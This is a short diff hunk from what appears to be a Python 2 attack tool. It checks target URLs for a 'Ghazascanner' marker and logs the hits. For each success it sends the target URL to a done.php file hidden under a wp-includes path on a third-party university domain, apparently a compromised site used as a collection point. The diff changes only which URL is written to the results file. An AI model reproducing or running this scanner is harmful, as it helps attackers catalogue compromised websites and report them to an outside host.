@@ -20,7 +20,7 @@ if IPAddr in requests.get('https://raw.githubusercontent.com/boters/PythonBot/ma
                 if 'Ghazascanner' in urlkans.text:
                     print '[Target:]  '+urlkan+'  ==> Success'
                     urlja = requests.get('https://fommpas.uns.ac.id/wp-includes/css/dist/edit-post/done.php?0='+urlkan)
-                    open('resultsx.txt', 'a').write(site+'\n')
+                    open('resultsx.txt', 'a').write(urlkan+'\n')
                 else:
                     print '[Target:]  '+url+'  ==> Failed'
             except:
